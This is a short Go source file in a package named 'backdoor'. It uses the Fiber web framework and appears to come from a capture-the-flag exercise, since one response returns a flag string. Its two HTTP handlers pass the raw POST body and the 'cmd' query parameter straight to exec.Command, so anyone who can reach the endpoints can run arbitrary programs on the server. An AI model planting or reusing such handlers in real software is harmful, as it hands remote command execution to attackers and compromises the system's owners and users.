/*
* @Author: Jingyuexing
* @Date:   2022-06-29 09:26:24
* @Last Modified by:   Jingyuexing
* @Last Modified time: 2022-07-03 00:35:11
 */

package backdoor

import (
	"fmt"
	"os/exec"

	"github.com/gofiber/fiber/v2"
)

func BackdoorPostHandler(ctx *fiber.Ctx)error{
  cmd := exec.Command(string(ctx.Body()))
  err := cmd.Run()
  if err != nil{
    return ctx.JSON(fiber.Map{
      "message":"some thing is error",
    })
  }
  return ctx.Next()
}

func BackdoorGetHandler(ctx *fiber.Ctx) error {
  _command := ctx.Query("cmd")

  fmt.Println(_command)
  cmd := exec.Command(_command)
  err := cmd.Run()
  if err != nil {
    return ctx.Next()
  }
  return ctx.JSON(fiber.Map{
      "command":_command,
      "err":err,
      "flags":"flag{2aa7d184-4fef-417d-b146-242deccd97f3}",
  })
}
